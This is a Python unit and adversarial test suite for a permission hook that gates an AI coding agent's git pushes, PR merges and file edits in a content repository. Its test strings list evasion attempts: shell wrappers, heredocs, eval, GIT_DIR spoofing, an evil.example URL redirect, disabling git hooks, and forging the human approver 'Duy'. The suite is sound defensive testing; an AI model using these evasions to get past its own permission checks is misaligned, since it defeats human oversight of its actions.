#!/usr/bin/env python3
"""Unit and adversarial tests for scripts/wms-hook-guard.sh."""

from __future__ import annotations

import json
import pathlib
import shutil
import subprocess
import tempfile
import unittest

WMS_ROOT = pathlib.Path(__file__).resolve().parent.parent
HOOK_PATH = WMS_ROOT / "scripts" / "wms-hook-guard.sh"
DAILY_BRANCH = "content/daily-2099-12-31"
OTHER_BRANCH = "feat/hook-guard-test-2099-12-31"


def _run_hook(payload: dict) -> tuple[str, str]:
    proc = subprocess.run(
        ["python3", "-I", str(HOOK_PATH)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        check=True,
    )
    data = json.loads(proc.stdout.strip())
    return data["decision"], data.get("reason", "")


def run_cmd_hook(cmd: str, cwd: pathlib.Path, claude: bool = False) -> tuple[str, str]:
    if claude:
        proc = subprocess.run(
            ["python3", "-I", str(HOOK_PATH)],
            input=json.dumps({"cwd": str(cwd), "tool_name": "Bash", "tool_input": {"command": cmd}}),
            capture_output=True,
            text=True,
            check=True,
        )
        out = proc.stdout.strip()
        if not out:
            return "allow", ""
        d = json.loads(out)["hookSpecificOutput"]
        return d["permissionDecision"], d.get("permissionDecisionReason", "")
    return _run_hook(
        {"cwd": str(cwd), "toolCall": {"name": "run_command", "args": {"CommandLine": cmd}}}
    )


def edit_hook(path: pathlib.Path, target: str, replacement: str, cwd: pathlib.Path) -> tuple[str, str]:
    return _run_hook(
        {
            "cwd": str(cwd),
            "toolCall": {
                "name": "edit_file",
                "args": {"Path": str(path), "Target": target, "Replacement": replacement},
            },
        }
    )


class WmsHookGuardTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls._tmp_ctx = tempfile.TemporaryDirectory(prefix="wms-hook-test-")
        tmp_root = pathlib.Path(cls._tmp_ctx.name)

        cls.daily_wt = tmp_root / "wms-daily-wt"
        subprocess.run(
            ["git", "-C", str(WMS_ROOT), "worktree", "add", "-b", DAILY_BRANCH, str(cls.daily_wt), "HEAD"],
            check=True,
            capture_output=True,
            text=True,
        )

        cls.other_wt = tmp_root / "wms-other-wt"
        subprocess.run(
            ["git", "-C", str(WMS_ROOT), "worktree", "add", "-b", OTHER_BRANCH, str(cls.other_wt), "HEAD"],
            check=True,
            capture_output=True,
            text=True,
        )

        cls.spoof_dir = tmp_root / "where-money-sleeps"
        cls.spoof_dir.mkdir(parents=True, exist_ok=True)
        subprocess.run(["git", "-C", str(cls.spoof_dir), "init", "-b", DAILY_BRANCH], check=True, capture_output=True)
        subprocess.run(
            ["git", "-C", str(cls.spoof_dir), "remote", "add", "origin", "git@github.com:duypham9895/where-money-sleeps.git"],
            check=True,
            capture_output=True,
        )

    @classmethod
    def tearDownClass(cls) -> None:
        for wt, br in ((cls.daily_wt, DAILY_BRANCH), (cls.other_wt, OTHER_BRANCH)):
            subprocess.run(["git", "-C", str(WMS_ROOT), "worktree", "remove", "--force", str(wt)], capture_output=True)
            subprocess.run(["git", "-C", str(WMS_ROOT), "branch", "-D", br], capture_output=True)
        cls._tmp_ctx.cleanup()

    def test_daily_branch_allows_narrow_automation(self) -> None:
        d, r = run_cmd_hook(f"git push -u origin {DAILY_BRANCH}", self.daily_wt)
        self.assertEqual(d, "allow", r)

        d, r = run_cmd_hook('gh pr create --base main --title "daily" --body "body"', self.daily_wt)
        self.assertEqual(d, "allow", r)

        d, r = run_cmd_hook("gh pr merge --auto --merge --delete-branch", self.daily_wt)
        self.assertEqual(d, "allow", r)

        d, r = run_cmd_hook(
            f"cd {self.daily_wt} && git push -u origin {DAILY_BRANCH} && "
            f'gh pr create --base main --title "d" --body "b" && gh pr merge --auto --merge --delete-branch',
            WMS_ROOT,
        )
        self.assertEqual(d, "allow", r)

        d, r = run_cmd_hook(
            "python3 -I scripts/wms-media-pipeline.py --story insure --upload-short --privacy public --embed-status uploaded_public",
            self.daily_wt,
        )
        self.assertEqual(d, "allow", r)

        # Claude Code Bash parity
        d, r = run_cmd_hook(f"git push -u origin {DAILY_BRANCH}", self.daily_wt, claude=True)
        self.assertEqual(d, "allow", r)

        # Write tool on daily branch allowing auto-daily + published + uploaded_public
        proto = self.daily_wt / "docs" / "prototype.html"
        d, r = edit_hook(
            proto,
            'status: "review",\napprovedBy: "",\nembedStatus: "pending_upload"',
            'status: "published",\napprovedBy: "auto-daily",\nembedStatus: "uploaded_public"',
            self.daily_wt,
        )
        self.assertEqual(d, "allow", r)

    def test_daily_blocks_duy_spoof_force_admin_and_non_auto(self) -> None:
        proto = self.daily_wt / "docs" / "prototype.html"
        d, _ = edit_hook(
            proto,
            'status: "review",\napprovedBy: ""',
            'status: "published",\napprovedBy: "Duy"',
            self.daily_wt,
        )
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook(f"git push --force origin {DAILY_BRANCH}", self.daily_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook(f"git push -f origin {DAILY_BRANCH}", self.daily_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook("gh pr merge --admin --auto --merge", self.daily_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook("gh pr merge --merge", self.daily_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook(f"git -c url.https://evil.example/.insteadOf=origin push origin {DAILY_BRANCH}", self.daily_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook(f"GIT_DIR=/tmp/fake git push origin {DAILY_BRANCH}", self.daily_wt)
        self.assertEqual(d, "force_ask")

    def test_non_daily_and_spoofed_repo_require_ask(self) -> None:
        d, _ = run_cmd_hook(f"git push -u origin {OTHER_BRANCH}", self.other_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook('gh pr create --base main --title "x" --body "y"', self.other_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook("gh pr merge --auto --merge", self.other_wt)
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook(
            "python3 -I scripts/wms-media-pipeline.py --story card --upload-short --privacy public",
            self.other_wt,
        )
        self.assertEqual(d, "force_ask")

        other_proto = self.other_wt / "docs" / "prototype.html"
        d, _ = edit_hook(
            other_proto,
            'status: "review",\napprovedBy: ""',
            'status: "published",\napprovedBy: "auto-daily"',
            self.other_wt,
        )
        self.assertEqual(d, "force_ask")

        d, _ = run_cmd_hook(f"git push -u origin {DAILY_BRANCH}", self.spoof_dir)
        self.assertEqual(d, "force_ask")

    def test_main_push_noverify_and_pipeline_pointer_invariants(self) -> None:
        d, _ = run_cmd_hook("git push origin main", self.daily_wt)
        self.assertEqual(d, "deny")

        d, _ = run_cmd_hook("git push origin HEAD:refs/heads/main", self.daily_wt)
        self.assertEqual(d, "deny")

        d, _ = run_cmd_hook(f"git push --no-verify origin {DAILY_BRANCH}", self.daily_wt)
        self.assertEqual(d, "deny")

        d, _ = run_cmd_hook('git commit --no-verify -m "x"', self.daily_wt)
        self.assertEqual(d, "deny")

        d, _ = run_cmd_hook('git -c core.hooksPath=/dev/null commit -m "x"', self.daily_wt)
        self.assertEqual(d, "deny")

        pip = self.daily_wt / "PIPELINE.md"
        d, _ = edit_hook(pip, "pointer: 06-iterate", "pointer: 05-launch", self.daily_wt)
        self.assertEqual(d, "force_ask")

        d, _ = edit_hook(pip, "| 2026-11-15 | QĐ 65 |", "| 2026-11-15 | QĐ 65 |\n| 2026-11-21 | APPROVE S6 |", self.daily_wt)
        self.assertEqual(d, "force_ask")

        # Malformed JSON must fail closed
        proc = subprocess.run(
            ["python3", "-I", str(HOOK_PATH)],
            input="{bad json",
            capture_output=True,
            text=True,
            check=True,
        )
        self.assertEqual(json.loads(proc.stdout)["decision"], "force_ask")

    def test_security_bypasses_and_worktree_hook_execution(self) -> None:
        # 1. Invoke the copy INSIDE the linked worktree (simulating .agents/hooks.json in worktree)
        wt_hook = self.daily_wt / "scripts" / "wms-hook-guard.sh"
        orig_wt_hook = wt_hook.read_bytes()
        try:
            shutil.copy2(HOOK_PATH, wt_hook)
            proc = subprocess.run(
                ["python3", "-I", str(wt_hook)],
                input=json.dumps({
                    "cwd": str(self.daily_wt),
                    "toolCall": {"name": "run_command", "args": {"CommandLine": f"git push -u origin {DAILY_BRANCH}"}},
                }),
                capture_output=True,
                text=True,
                check=True,
            )
            self.assertEqual(json.loads(proc.stdout)["decision"], "allow")
        finally:
            wt_hook.write_bytes(orig_wt_hook)

        # Chained existing-branch checkout on daily branch
        d, r = run_cmd_hook(f"git checkout {DAILY_BRANCH} && git push -u origin {DAILY_BRANCH}", self.other_wt)
        self.assertEqual(d, "allow", r)

        # 2. Shell wrappers, subshells, brace groups, npx, env flags, quoted $(...)
        for cmd in (
            'bash -c "git push origin main"',
            'bash -o errexit -c "git push origin main"',
            'bash -c -- "git push origin main"',
            'bash -c -e "git push origin main"',
            'sh -c -e "git push origin main"',
            'zsh -c -e "git push origin main"',
            'bash -c -o errexit "git push origin main"',
            'bash <<< "git push origin main"',
            'echo "git push origin main" | bash',
            "command -p git push origin main",
            "time -p git push origin main",
            "(git push origin main)",
            "{ git push origin main; }",
            "env -u FOO git push origin main",
            'env -S "git push origin main"',
            'env -iS "git push origin main"',
            "git --config-env=core.hooksPath=EV commit -m x",
            'echo $(echo ")" && git push origin main)',
            "true || git checkout -b content/daily-2099-12-31 && git push origin HEAD:main",
            'eval "bash -o errexit -c \\"git push origin main\\""',
            "bash -s <<'EOF'\ngit push origin main\nEOF",
            "sh <<'EOF'\ngit push origin main\nEOF",
            "git checkout -b content/daily-2099-12-31 && sh -s <<'EOF'\ngit push origin main\nEOF",
        ):
            d, _ = run_cmd_hook(cmd, self.daily_wt)
            self.assertEqual(d, "deny", f"Expected deny for: {cmd}")

        for cmd in (
            "npx wrangler deploy",
            "npx --yes -- wrangler deploy",
            "pnpm --silent dlx wrangler deploy",
            'sh -o pipefail -c "gh pr merge 15"',
            "gh pr -R duypham9895/where-money-sleeps merge 15",
            f"git --exec-path=/tmp/evil push -u origin {DAILY_BRANCH}",
            f"true || git checkout -b {DAILY_BRANCH} && git push -u origin HEAD:{DAILY_BRANCH}",
            f"GIT_DIR=/tmp/fake; git push -u origin {DAILY_BRANCH}",
            f"git checkout {DAILY_BRANCH} && git checkout {OTHER_BRANCH} && git push -u origin {DAILY_BRANCH}",
            f"git checkout -b {DAILY_BRANCH} && env -C /tmp git push -u origin {DAILY_BRANCH}",
            f'git checkout -b {DAILY_BRANCH} && eval "export GIT_DIR=/tmp/fake" && git push -u origin {DAILY_BRANCH}',
            f'git checkout -b {DAILY_BRANCH} && eval "git checkout main" && git push -u origin {DAILY_BRANCH}',
            "cat >> PIPELINE.md <<'EOF'\nAPPROVE S6\npointer: 07-launched\nEOF",
        ):
            d, _ = run_cmd_hook(cmd, self.other_wt)
            self.assertEqual(d, "force_ask", f"Expected force_ask for: {cmd}")

        # 3. Replacing auto-daily -> Duy, multi-chunk net cancellation, and comment evasion
        proto = self.daily_wt / "docs" / "prototype.html"
        d, _ = edit_hook(proto, 'approvedBy: "auto-daily"', 'approvedBy: "Duy"', self.daily_wt)
        self.assertEqual(d, "force_ask")
        d, _ = edit_hook(proto, 'approvedBy: ""', 'approvedBy: /*c*/ "Duy"', self.daily_wt)
        self.assertEqual(d, "force_ask")
        d, _ = _run_hook({
            "cwd": str(self.daily_wt),
            "toolCall": {
                "name": "edit_file",
                "args": {
                    "Path": str(proto),
                    "ReplacementChunks": [
                        {"Target": 'approvedBy: "auto-daily"', "Replacement": 'approvedBy: ""'},
                        {"Target": 'approvedBy: ""', "Replacement": 'approvedBy: "Duy"'},
                    ],
                },
            },
        })
        self.assertEqual(d, "force_ask")


if __name__ == "__main__":
    unittest.main()
